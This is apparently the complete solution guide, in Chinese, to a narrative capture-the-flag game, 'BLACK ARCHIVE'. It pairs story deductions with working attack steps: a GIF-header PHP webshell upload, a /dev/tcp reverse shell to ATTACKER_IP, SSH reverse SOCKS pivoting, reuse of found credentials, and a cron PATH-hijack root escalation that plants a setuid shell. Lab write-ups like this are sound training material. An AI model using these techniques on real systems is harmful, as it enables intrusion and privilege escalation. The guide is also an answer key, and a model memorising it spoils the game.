# BLACK ARCHIVE — 完整解答

> 只給正確的 payload、帳密、跟每一步的推理過程。不解釋「為什麼這樣設計」，
> 只解釋「為什麼答案是這個、為什麼不是別的」。設計理由見
> `../story-dev/attack_chain_design.md`；純操作記錄見 `walkthrough.md`。
>
> 三台主機：FRONTIER（172.20.1.10，host 對外開 8080/8025）→ RELAY
> （dmz 172.20.1.12 / internal 10.10.0.12，無 host port）→ ARCHIVE
> （internal 10.10.0.15，別名 `cairn.internal`，無 host port）。

---

## 一、FRONTIER

### 1. 立足點：Case File Intake 上傳漏洞

`?page=upload` 用 `getimagesize()` 擋非圖片檔，但沒有副檔名白名單、沒有重新命名，`.php` 一樣會被 php-fpm 執行。`getimagesize()` 只檢查檔頭，在合法 GIF 檔頭後面接 PHP payload 就能過檢查：

```bash
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00<?php system($_GET["c"]); ?>' > shell.php
curl -F "file=@shell.php;type=image/gif" "http://TARGET:8080/?page=upload"
curl "http://TARGET:8080/uploads/shell.php?c=id"
# uid=33(www-data)
```

**推理過程**：這個功能之所以值得測，是因為案件卡上（`?page=search`）Okafor/Wren/Farrow 三筆多了其他案件都沒有的 `Internal transfer ref` 欄位——這是玩家自己第一手看到的異常。首頁公告跟 upload 頁本身的文字都講「這是案件結案後唯一還能新增/補正文件的管道」，玩家想知道這三筆案件的原始資料能不能從這裡拿到更多，才會去測這個功能，不是單純「有上傳功能就測」。

拿到 shell 後第一件事：`cat /var/backups/roster/reyes_scratch.txt`（不在 webroot 下，`?page=notes&file=` 的 `basename()` 限制碰不到，只有真的拿到程式碼執行才讀得到）——T. Reyes 自己把整個索引比對過一輪的私人筆記，確認**只有這 3 筆已結案案件帶 `transfer_ref`，其他全部是空的**，第一次得到「突破後才能確認」的故事事實。

### 2. 帳密推論：`sysadmin` / `admin123`

**不是單一文件直接給的**，要合併兩份文件：

- `notes/credential_rotation_status.txt`：`sysadmin` 從沒經過 first-login 輪替，還在用 provisioning 範本的預設值（`devuser`/`deploy` 已標記輪替/停用，死線索——這兩個帳號在系統裡也確實已經不存在了）。
- `notes/welcome.txt`：一句跟任何特定帳號無關的通用政策——「新帳號的範本預設密碼是 `admin123`」。

**推理**：把「哪個帳號沒輪替」（`sysadmin`）跟「範本預設是什麼」（`admin123`）接起來，才是 `sysadmin/admin123`。沒有任何一份文件單獨寫出這組完整帳密。

### 3. Webmail 登入

```bash
curl -c cookie.txt -X POST "http://TARGET:8025/login" --data "user=sysadmin&pass=admin123"
curl -b cookie.txt "http://TARGET:8025/inbox"
```

沒有 `/debug` 環境變數洩漏可以抄捷徑，也沒有繞過登入直接讀信箱的路——讀信箱唯一的路就是上面推出來的密碼。

18 封信裡 7 封跟劇情有關，關鍵的幾封：
- `root/S3cretDB!2024`（LEDGER sandbox DB，跟後面 RELAY 的 MariaDB root 密碼互相印證）
- 巢狀引言的多部門工單串，N. Okafor（Records，temp. migration support）當下就抱怨過 `transfer_ref` 對不起來、被上級用「已知的 migration artifact」打發——這是 N. Okafor 這個名字第一次出現在玩家眼前，也是 LONGSHORE 身分鏈的第一環（見下方附錄）。
- 兩封殖民地行政單位（Dumont / Brandt）分別追問 Okafor、Wren 案子的公文，都被 Records 用幾乎一樣的公式化語言打發，且都提到「不是第一次問了」。

**推理節點：為什麼「這只是遷移假影」這句官方說法值得懷疑**

三個完全獨立的來源（`welcome.txt` 的新人口頭傳承、`todo.txt` 的系統人員私人待辦、webmail 裡 Records 對全體 handler 的正式公告）對同一件事給出幾乎逐字相同的說法。

- **為什麼「純屬巧合/雜訊」站不住腳**：如果真的是各自獨立寫成，措辭不會近乎逐字相同——這只能證明「有人在統一口徑」。
- **但這還不能證明「官方在說謊」**：措辭統一也可能只是官僚惰性複製貼上一份無害的範本，不需要陰謀就能解釋。真正排除得掉「純屬隨機雜訊」的，是第三組線索——這句話剛好只黏著 LONGSHORE 名單裡的名字，而且persist 好幾年（Dumont/Brandt 兩封公文），雜訊不會系統性地只黏著特定幾個名字。
- **這裡能得出的正確結論**：官方的說法太一致、太方便，一致到不像自然發生的——這是「建立懷疑」，不是「證明說謊」。「失職 vs 刻意淡化」這兩種可能性在這個階段的證據下無法分辨，要等後面才有更多證據。

---

## 二、Pivot 進 RELAY

FRONTIER shell 只是一次性 webshell，要先升級成互動式 shell 才能用密碼登入 SSH：

```bash
curl "http://TARGET:8080/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
# 攻擊機這邊先起 listener：nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'   # 升級成真正的 TTY，否則 ssh 密碼提示打不進去
ssh sysadmin@172.20.1.12   # 密碼 admin123
```

relay 沒有映射任何 host port，但跟 frontier 在同一個 dmz 網段（172.20.1.0/24），container 間互通，不需要額外設定。

---

## 三、RELAY

### 4. LEDGER API

```bash
curl http://127.0.0.1:3000/api/cases          # 只回摘要：id/name/colony（系統帳號只回 id/type）
curl http://127.0.0.1:3000/api/cases/1        # 完整紀錄：Eli Okafor，transfer_ref SPINDLE-7-0119
curl http://127.0.0.1:3000/api/cases/2        # Talia Wren，SPINDLE-7-0142
curl http://127.0.0.1:3000/api/cases/3        # Dominic Farrow，SPINDLE-7-0087
curl http://127.0.0.1:3000/api/cases/4        # Priya Anand，無 transfer_ref（對照組）
curl http://127.0.0.1:3000/api/cases/5        # 不是案件，是系統帳號 ledger-cairn-sync
curl http://127.0.0.1:3000/api/health         # internal_services.archive_fileshare: "degraded"（不給位址）
```

**記下 case_ref↔姓名對照表，後面全程要用**：`OCPA-R4-11902=Okafor`、`11944=Wren`、`11887=Farrow`、`10733=Voight`（Voight 只在 relay DB 背景資料出現，前台搜尋查不到）。

### 5. MariaDB

```bash
mariadb -h 127.0.0.1 -u root -p'S3cretDB!2024' --skip-ssl ledger
```

**兩個容易打錯的地方**：
- 不能省略 `-h`（或用 `localhost`）——省略會走 local Unix socket，MariaDB 的 `unix_socket` 認證外掛可能讓本機使用者直接免密碼登入，不算真的驗證到密碼。`-h 127.0.0.1` 才是強制走 TCP、真正驗證密碼的方式。
- 遠端連線預設會被要求 TLS（`ERROR 2026 ... SSL is required`），要加 `--skip-ssl`。

```sql
SELECT * FROM service_accounts;
-- CAIRN Fileshare 帳密（跟 sysadmin/admin123 一樣，密碼重用印證）
-- backup/backup，"Gateway Maintenance SSH"，relay.internal —— 這是獨立的第二條密碼發現管道，
--   跟 sysadmin 的密碼重用是完全不同的兩件事，不是同一份文件重複重用
SELECT * FROM dependent_case_index;  -- 更多背景案件（含 Samuel Voight）
SELECT * FROM system_migration_log;  -- 第一次點名 ONI Section III / Cmdr. Petrov
```

`system_migration_log` 裡還有一筆 2540 年 Records Compliance Office 的正式結案回應：「查過了，是批次匯入的假影，沒有異常」。

**推理節點：官方稽核 vs 你自己找到的證據**

你在上一步已經親眼看過 `transfer_ref` 的模式，只出現在特定幾筆案件上，不是隨機雜訊。

**為什麼這裡誠實地無法確定**：這筆結案回應只有結論，沒有留下當年實際調查過程的任何紀錄——「失職」（隨便看一眼就結案）跟「刻意淡化」（其實查出東西但選擇不寫）在這個階段的證據下會產生一模一樣的輸出：一句簡短的官方結論，沒有過程紀錄可以分辨。跟後面 07-B 身分還原不一樣——那裡有殖民地/年齡兩個獨立資料點可以交叉比對，這裡只有一個結論、沒有第二個獨立資料點。**誠實的結論是「無法確定」**，要等 ARCHIVE 的 `cairn_access_log_extract.txt` 跟 root 文件才有更多證據。

`service_accounts` 沒有 CAIRN Records Terminal 的帳密，要去查檔案系統。

### 6. sync.conf

```bash
cat /etc/ledger/sync.conf
# administrator / Records!Access99  ← CAIRN Records Terminal 帳密
```

這組帳密跟 `service_accounts` 是兩條刻意分開的發現管道：`service_accounts` 只給 CAIRN Fileshare（密碼重用印證），CAIRN Records Terminal 的帳密要另外在檔案系統裡找，不是同一份文件重複重用。

---

## 四、Pivot 進 ARCHIVE

relay 沒裝 `smbclient`，SMB/HTTP 操作要用攻擊機自己的工具，所以要把攻擊機接進 internal network，不是單純轉發：

```bash
# 在 relay 的 shell 裡，開一個反向 dynamic SOCKS 轉發回攻擊機自己的 sshd
ssh -R 1080 <攻擊機帳號>@ATTACKER_IP -N
# 攻擊機這邊要先確保自己有在跑 sshd
```

之後攻擊機自己的工具都透過 `proxychains4`（指向 `socks5 127.0.0.1 1080`）打，能碰到只在 internal network 上的 archive。

---

## 五、ARCHIVE

### 7. SMB 列分享

```bash
proxychains4 smbclient -L //cairn.internal/ -U sysadmin%admin123 -m NT1
# public / confidential / backups
```

`-m NT1` 是必要的：archive 的 `smb.conf` 刻意設成 `server min protocol = NT1`（允許 SMBv1），不加這個 flag，現代 smbclient 預設協商不到。

### 8. public（guest，免密碼）

```bash
proxychains4 smbclient //cairn.internal/public -U guest% -m NT1 -c "ls"
```

`records_retention_schedule.txt` 值得注意，但要小心不要跟 root 文件的機制講反：一般結案案件 30 年後會被排入銷毀複審排程（Eli/Wren 這類 2517 年結案的案件，30 年後正好落在 2547 年）；**但 disposition-hold 記錄（Farrow/07-B 那份低溫懸置單位）明文排除在這個常規複審排程之外**，只有在「持有系統本身被除役/遷移時」才會一併被拉出來做保管狀態複查——這才是對應 root 文件「SPINDLE 除役的標準檔案檢查把 07-B 列入審查清單」的真正觸發路徑，兩者是平行但不同的機制，只是剛好都落在 2547 年。

### 9. confidential（`valid users = sysadmin`）

```bash
proxychains4 smbclient //cairn.internal/confidential -U sysadmin%admin123 -m NT1 \
  -c "get acquisition_directive_excerpt.txt; get cairn_access_log_extract.txt; \
      get spartan_designation_crosscheck.txt; get cairn_backup_key"
```

- `acquisition_directive_excerpt.txt`：**SPARTAN-II 名稱正式出現**——這批人員編入既有的 SPARTAN-II 計畫（Section III 內部代號，2511 年起使用），從 150 名候選人裡選出這 75 名執行帶離，動機是殖民地叛亂風險，不是為了星盟（那時候星盟根本不在任何人的擔憂清單上）。這份文件只講「為什麼帶走、怎麼掩蓋」，不講候選人後來怎麼了。
- `cairn_access_log_extract.txt`：`i.petrov` 在 2547-02-11 10:03 先 `RECORD_VIEW` 了 106（Farrow 的低溫轉移授權），10:19 對「07-B」做了一筆 `CUSTODY_STATUS_SET`——注意這裡動的是一個獨立的保管狀態欄位，不是 106 這份文件本身的內容。不解答「為什麼」，只證明「他那天確實碰過那個欄位」，跟 root 文件互相印證。
- `spartan_designation_crosscheck.txt`：一份法定保留審查的內部比對備忘，只給 case_ref 對現役 Spartan 編號、**完全沒有姓名**（見下方「案件結果重建」）。
- `cairn_backup_key`：真的 RSA 私鑰，這是拿到 archive 本機 shell 的唯一方式。

### 10. SSH（key-only，密碼登入被關掉了）

```bash
chmod 600 cairn_backup_key
proxychains4 ssh -i cairn_backup_key sysadmin@cairn.internal
```

archive 的 sshd 被獨立加固過：`PasswordAuthentication no`，`sysadmin/admin123` 對 SSH 完全無效（`Permission denied (publickey)`），Samba 不受影響、繼續吃這組密碼——這是刻意設計，逼玩家不能單純密碼重用就跳過拿 key 的步驟。

### 11. backups（guest，操作失誤留下的東西）

```bash
proxychains4 smbclient //cairn.internal/backups -U guest% -m NT1 \
  -c "get casualty_log_partial.txt; get training_roster_fragment.txt; \
      get foia_review_2553.txt; get dependent_notification_fragment.txt; \
      get n.okafor_badge_photo.jpg"
```

- `casualty_log_partial.txt`：四筆 augmentation 結果，**只有 case_ref，沒有姓名也沒有 Spartan 編號**。
- `training_roster_fragment.txt`：只有訓練代號 + 殖民地 + 年齡，不給姓名——「cohort 07」的殘存片段：
  ```
  07-A  Eridanus II  6
  07-B  Skopje       6
  07-C  Madrigal     6
  07-D  Eridanus II  7
  ```
- `foia_review_2553.txt` / `dependent_notification_fragment.txt` / `n.okafor_badge_photo.jpg`：LONGSHORE 身分鏈的其餘部分，見下方附錄（optional，不影響主線）。

### 推理節點：案件結果 + Spartan 編號重建（跨兩個存取層級）

`casualty_log_partial.txt`（backups，guest 權限）跟 `spartan_designation_crosscheck.txt`（confidential，要 sysadmin 密碼）都只用 case_ref，**兩份都不寫姓名**，而且存取權限不同——不是同一份文件的兩個部分。要把三樣東西攤開對表：

1. **case_ref → 姓名**：第 4 步（LEDGER API）已經記下的對照表——`11902=Okafor`、`11944=Wren`、`11887=Farrow`、`10733=Voight`。
2. **case_ref → 結果**（`casualty_log_partial.txt`）：`11902` augmentation failure, deceased；`11944` successful, active service；`11887` failure, discharged, permanent disability（有爭議，見下）；`10733` successful, active service。
3. **case_ref → 現役編號**（`spartan_designation_crosscheck.txt`）：`11944 = Spartan-108`；`10733 = Spartan-128`。

**拼出來**：Eli Okafor 死亡；Talia Wren 現役、編號 Spartan-108；Samuel Voight 現役、編號 Spartan-128；Dominic Farrow 的結果有爭議（見下方推理節點）。這個結論沒有任何一份文件單獨講過，是三份資料對表出來的——姓名對照免密碼、結果只要 guest SMB、編號卻要 sysadmin 認證，存取難度隨資訊敏感度遞增。`casualty_log_partial.txt` 那句「Active service designations are not to be cross-referenced against current Spartan service rosters outside of Section III」不只是氣氛文字，`spartan_designation_crosscheck.txt` 本身就是那句警告所描述的行為留下的紀錄——這也是為什麼這份比對筆記被收進限閱層級更高的 confidential share。

### 12. 登入 CAIRN Records Terminal

```bash
proxychains4 curl -c cairn_cookies.txt -X POST cairn.internal:8080/login \
  -d "username=administrator&password=Records!Access99"
# 302 + Set-Cookie: cairn_session=...，存進 cairn_cookies.txt
proxychains4 curl -b cairn_cookies.txt cairn.internal:8080/dashboard
proxychains4 curl -b cairn_cookies.txt cairn.internal:8080/records/101
# 101~106 依序讀完
```

帳密是第 6 步在 `sync.conf` 找到的合法帳密。**注意 cookie 檔要自己存新的一份**（`cairn_cookies.txt`），不要沿用 webmail 那份 `cookie.txt`——是兩台不同主機、各自獨立的 session。

**六份文件**：
- **101** Disposition Order 2547-014：Petrov 授權「保留、限閱、不銷毀」，並註明 CAIRN 本身是待轉移的 staging mirror，正式除役排程沒真的執行完——解釋了為什麼這台機器資安這麼糟。
- **102** Flash-Clone Substitution Protocol：候選人被替代生物紀錄（flash clone，全身式，已知本來就無法長期存活，這是複製過程本身的固有限制，不是刻意打造的缺陷）頂替，clone 短時間內以看似自然/醫療死亡的方式衰竭，讓當地醫師無理由起疑也不用被告知計畫存在。Dr. Castel 的角色是計畫端醫療督導、事後審核，並沒有親自到場簽署。她自白「事後審核並簽核了三份案件檔案」——**沒寫是哪三份**。
- **103** Halsey 書信片段：「你問我能不能接受這件事……我不會假裝這是別的什麼」——道德複雜性，同意候選人名單。
- **104** Kade 備忘錄：他是 Chief Mendez 麾下的訓練幹部之一，負責 SPINDLE 名單裡一小群、不是整個梯隊。追加段落只用訓練代號「07-B」講一段親眼所見：「Skopje 來的，我帶過最凶的六歲小孩……官方紀錄上那一筆寫的是醫療除役。我在強化艙親眼看到的不是那樣。」
- **105** Medical Certification Log Fragment：三欄表格——案件編號 / 當地簽署醫師 / ONI 檔案審核：
  ```
  OCPA-R4-11902   Dr. H. Idowu（Eridanus II）  M. Castel
  OCPA-R4-11944   Dr. A. Petrides（Madrigal）  M. Castel
  OCPA-R4-11887   Dr. T. Marlow（Skopje）      M. Castel
  OCPA-R4-10733   Dr. H. Idowu（Eridanus II）  R. Achebe
  ```
- **106** Cryogenic Recovery Transfer Authorization - Subject 07-B：2525 年，他被判定「臨床上無法存活」，轉入低溫懸置，後續無追蹤紀錄。

### 推理節點：三份 vs 四筆

102 說 Castel「事後審核簽核了三份」，但沒寫是哪三份。105 的表格列出**四筆**：對表後發現前三筆的 ONI 端審核都是 Castel，**第四筆（`OCPA-R4-10733`，Voight）是 Dr. R. Achebe 審核簽核的**。

**這不是需要排除替代解釋的推論，是直接證據**：105 的表格白紙黑字寫著第四筆審核人是誰，不是「大概是別人」這種靠間接證據拼湊的結論。唯一的「推理」工作是「有沒有主動去比對」——102 只講數量、不講明細，玩家要自己去 105 對出這三份是哪幾筆、第四筆又是誰。**結論**：涉入這件事的 ONI 端醫療人員不只 Castel 一個；當地簽署醫師則完全是各殖民地不知情的一般醫師，跟 ONI 端的審核是兩層不同的人。

### 推理節點：代號還原真名——07-B = Dominic Farrow

`training_roster_fragment.txt` 裡 Skopje 只有一筆案例（07-B），Farrow 的殖民地正好是 Skopje。

**為什麼合理**：
- 殖民地（Skopje）跟徵召年齡（6 歲）兩個獨立資料點都吻合，不是只挑一項符合。
- Kade 對 07-B 的描述帶著具體的個人情感記憶，跟他自述「負責的只是一小群，不是整個梯隊」吻合——07-B 是他真的親自從頭訓練到底的人，不是隨口提一個不熟的名字。
- **最關鍵的一點**：這款遊戲對所有「真正無法確定」的節點（官方稽核矛盾、Farrow 的結局）都會**至少留兩份文件互相打架**，讓矛盾是玩家自己讀出來的。07-B 這裡遍尋所有文件都沒有出現第二個 Skopje 案例，也沒有任何一份文件暗示這種可能性——這種「沒有矛盾線索並存」的狀態，依照遊戲一貫的設計邏輯，本身就是「這裡不是刻意留白節點」的訊號。遊戲不會無中生有引入一個玩家永遠查不到、也沒有任何文件暗示存在的競爭對象，來讓一個原本清楚的推論落空。

**這個節點解決的是「07-B 是誰」，不是「07-B 後來怎麼了」**——身分確定，結局不確定，是兩件事。

### 推理節點：Dominic Farrow 的結局——三份互相矛盾，永遠不解答

三份來源現在攤在你面前：
1. 官方 casualty log：discharged, permanent disability（除役，永久殘障）。
2. Kade 備忘錄：親眼看到他死在強化艙裡。
3. 106 低溫轉移授權：臨床上無法存活，轉入懸置，後續無追蹤紀錄。

**為什麼這三份來源沒有辦法互相裁決**：三份都是各自領域裡合理、可信的一手來源——官方 casualty log 是制度性紀錄（沒有明顯造假動機，但制度性紀錄本來就可能因行政便宜行事而失真）；Kade 是在場目擊者，事後多年才寫、明確標註「反正沒人會看」，沒有明顯說謊動機，但記憶跟情感投射本身不是絕對可靠的證據；低溫轉移授權是同批次的醫療行政文件，時間點吻合，但它自己都承認「recovery team 選擇直接進入懸置，未記錄正式的現場判定結果」——連它自己都不是一份完整、經過正式判定的紀錄。**三者互相牴觸，但沒有任何一份能被另外兩份證偽，也套不上多數決**（三份各說各話，不是兩份一致、一份不同）。

root 文件裡 Petrov 自己也講了同一件事：他讀過三份、順序都讀過不只一次，**也沒有打算再寫第四個版本**。這不是遊戲偷懶不給答案——是誠實反映「有些事在現有證據下就是查不出來」。**這裡沒有正確答案，接受它本來就沒有乾淨答案，就是正確的結論。**

### 13. 本機提權（PATH hijack via cron）

```bash
cat /etc/crontab
# PATH=/opt/staging:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# * * * * * root /opt/healthcheck.sh

ls -la /opt/healthcheck.sh        # -rwxr-x--- root release（讀得到寫不到）
cat /opt/healthcheck.sh
# logtool "Health check: $(date)" >> /var/log/health.log   ← 呼叫的 logtool 沒寫絕對路徑

id sysadmin                       # sysadmin 是 release 群組成員
ls -la /opt/staging               # drwxrwxr-x root release  ← release 群組可寫

cat > /opt/staging/logtool << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
EOF
chmod +x /opt/staging/logtool
# 等 root cron 在 60 秒內執行
/tmp/rootbash -p
# euid=0(root)
```

**推理過程**：root crontab 的 `PATH=` 把 `/opt/staging` 排在系統目錄**前面**，`/opt/healthcheck.sh` 內部呼叫的 `logtool` 沒有寫絕對路徑，而 `sysadmin` 剛好是 `release` 群組成員、`/opt/staging` 對這個群組可寫——把一個叫 `logtool` 的檔案放進 `/opt/staging`，root 的 cron 下一分鐘內就會用 root 身份執行它。這是幾步 enumeration 串起來的鏈（讀 crontab → 讀腳本 → 看 `id` → 看目錄權限），不是單一 misconfig。

### 14. 最終文件

```bash
cat /root/cairn_disposition_review.txt
```

**這份文件回答的具體問題**：SPINDLE 除役的標準檔案檢查把 07-B（Farrow）的低溫懸置單位列入「繼續保管或最終處置」審查清單。一份正式審查會強迫把 augmentation 紀錄、訓練紀錄、原始結案紀錄這三份彼此不該被同一批人同時讀到的文件攤開在一起，讓 acquisition 計畫在戰爭仍在進行的 2547 年意外曝光。**Petrov 在正式審查觸發前，未經授權，私自把保管狀態改成「繼續、無需處理」，跳過了整個審查流程**——不是因為他知道 07-B 活著或死了，而是因為他不想讓別人被迫去查出比這更多的事。

文件本身承認：這個動作沒有任何正式授權文書；沒有銷毀任何東西；他讀過三份矛盾來源不只一次，也不打算在這裡寫第四個版本。**07-B 是否存活，這份文件依然不解答**——它只回答「這份三十年前的死亡紀錄，為什麼會在 2547 年被重新處理過」，這正是 LONGSHORE 開場真正要玩家找到的東西。

---

## 附錄：LONGSHORE = Naomi Okafor（optional，不影響主線）

三個獨立線索疊在同一個案件編號上：

1. relay `system_migration_log`：「N. Okafor, Colonial Records Clerk」在 2547 年處理的正好是包含 Eli 案件在內的那批 Eridanus II/Madrigal 重新索引作業。
2. archive `dependent_notification_fragment.txt`：Eli 案件的登記監護人全名是「Naomi Okafor」。
3. archive `foia_review_2553.txt`：2553 年提出申請的 N. Okafor，申請的對象正好又是同一筆 Eli 的案件；備註裡 Compliance 官員 S. Andrade 自己也注意到「這個名字跟 2547 年那個臨時協助遷移的人員同名」，但依人事系統判定「無關」。

**為什麼這不只是同名巧合**：三個文件各自獨立存在（不同年份、不同系統、不同目的），但全部指向同一個案件編號。如果是三個互不相關的人，代表巧合疊了三層：一個無關的記錄員恰好處理到 Eli 的案子、一個無關的申請人恰好用同一個案件編號申請、監護人姓名又恰好跟前面兩者同名。單一解釋（三份文件講的是同一個人）需要的巧合遠比三個無關的人疊在一起少。

**為什麼「官方自己都判定無關了」不能當反證**：S. Andrade 的判定依據是「per personnel records on file」——這是對照人事系統查有沒有正式登記的親屬關係，而監護人資格登記在被扶養人案件系統裡，兩套系統本來就不會自動互相參照。官員的「無關」判定是一次淺層的資料庫比對沒找到自動關聯，不是真的去比對過這兩個系統各自記載的實際內容——玩家手上同時握有這兩套系統各自的內容，官員當時沒有。

**這條線的分寸**：終究是循環佐證出來的推論，不是鐵證（極端巧合的可能性沒有被邏輯排除，只是機率極低）。證據夠強、足以讓玩家自己判斷，但遊戲不會把這個推論包裝成不容置疑的事實，也不強制玩家發現。

---

## 帳密總表

| 帳密 | 用途 | 發現管道 |
|---|---|---|
| `sysadmin` / `admin123` | webmail 登入、relay SSH、archive SMB | frontier `credential_rotation_status.txt`（誰沒輪替）+ `welcome.txt`（範本預設值是什麼），兩份文件合起來才是完整答案 |
| `root` / `S3cretDB!2024` | relay MariaDB | frontier webmail 收件匣第二封信；跟 relay `service_accounts` 表互相印證 |
| `backup` / `backup` | relay 「Gateway Maintenance SSH」（獨立的次要路徑） | relay MariaDB `service_accounts` 表 |
| `administrator` / `Records!Access99` | CAIRN Records Terminal | relay 檔案系統 `/etc/ledger/sync.conf` |
| `cairn_backup_key`（RSA 私鑰，非帳密） | archive 本機 SSH（唯一路徑，密碼認證被關掉了） | archive SMB confidential share |
